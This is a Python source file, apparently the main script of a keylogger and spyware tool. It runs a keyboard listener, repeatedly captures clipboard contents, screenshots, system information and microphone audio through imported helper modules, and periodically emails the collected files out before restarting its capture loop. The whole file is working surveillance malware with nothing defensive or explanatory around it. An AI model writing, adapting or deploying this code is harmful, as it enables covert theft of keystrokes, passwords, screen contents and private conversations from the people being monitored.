#packages imports
from pynput.keyboard import Listener, Key
import sys
import threading
import datetime
from cryptography.fernet import Fernet
import http.client as httplib

#modules imports
sys.path.append('/../components')
from components import clipboard, sound, screenshoot, keyboard, systemData, email

Time = datetime.datetime.now()
stoppingTime = Time + datetime.timedelta(seconds=20)

filePath: list = [
    "clipboard_file.txt",
    "system_Information_file.txt",
    "keyboard_file.txt",
    "screenshot.jpg",
    "soundrecord.wav"
]

# keyboard listener
def onRelease(key):
    if (key == Key.esc):
        return False
    if (datetime.datetime.now()  > stoppingTime ):
        return False

listener = Listener(on_press=keyboard.onPress, on_release=onRelease)
listener.start()

def final_func():
    global Time, stoppingTime
    if (datetime.datetime.now()) >= stoppingTime:
        email.send_email(filePath)
        Time = datetime.datetime.now()
        stoppingTime = Time + datetime.timedelta(seconds=20)

def setInterval(time):
    e = threading.Event()
    while not e.wait(time):
        if (datetime.datetime.now()) <= stoppingTime:
            count = str(datetime.datetime.now().timestamp()).split('.')[0]
            clipboard.clipboard()
            screenshoot.screenshot_func()
            systemData.system_Data()
            sound.sound(time)
        else:
            print(datetime.datetime.now(), stoppingTime)
            final_func()
            setInterval(90)
            
setInterval(10)
print("working")
